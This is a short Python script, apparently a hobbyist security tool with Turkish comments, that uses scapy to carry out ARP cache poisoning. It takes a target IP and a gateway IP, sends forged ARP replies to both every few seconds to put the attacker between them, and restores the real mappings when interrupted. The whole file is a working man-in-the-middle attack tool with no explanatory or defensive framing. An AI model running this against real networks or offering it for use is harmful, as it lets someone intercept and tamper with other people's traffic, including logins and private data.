import scapy.all as scapy
import time
import optparse

def get_mac_address(ip):
    arp_request=scapy.ARP(pdst=ip)#arp isteği gönderir
    broadcast_packet=scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #broadcast yayını yapar ve ip macleri alır
    combined_packet = broadcast_packet/arp_request #iki paketi birleştirmeye yarar
    answered_list=scapy.srp(combined_packet,timeout=1,verbose=False)[0]
    return answered_list[0][0].hwsrc
    #answered_list.summary()

def arp_pois(target1,poise1):

    target_mac=get_mac_address(target1)

    arp_response=scapy.ARP(op=2,pdst=target1,hwdst=target_mac,psrc=poise1)
    scapy.send(arp_response,verbose=False)

def reset_operation(target_ip,poise_ip):

    fooled_mac=get_mac_address(target_ip)
    poise_mac=get_mac_address(poise_ip)

    arp_response=scapy.ARP(op=2,pdst=target_ip,hwdst=fooled_mac,psrc=poise_ip,hwsrc=poise_mac)
    scapy.send(arp_response,verbose=False,count=6)


def get_user_input():
    parse_object = optparse.OptionParser()

    parse_object.add_option("-t","--target",dest="target1",help="Target IP")
    parse_object.add_option("-g","--gateway",dest="poise1",help="Gateway IP")

    ip_list=parse_object.parse_args()[0]

    if not ip_list.target1:
        print("Enter Target IP")
    if not ip_list.poise1:
        print("Enter Gateway IP")

    return ip_list

number = 0


user_ips=get_user_input()
user_target_ıp=user_ips.target1
user_gateway_ıp=user_ips.poise1

try:
    while True:

        arp_pois(user_target_ıp,user_gateway_ıp)
        arp_pois(user_gateway_ıp,user_target_ıp)

        number += 2

        print("\rSending packets " + str(number),end="")

        time.sleep(3)
except KeyboardInterrupt:
    print("\nQuit & Reset")
    reset_operation(user_target_ıp,user_gateway_ıp)
    reset_operation(user_gateway_ıp,user_target_ıp)
except IndexError:
    print("Please Again Enter Target/Gateway Ip ")

	
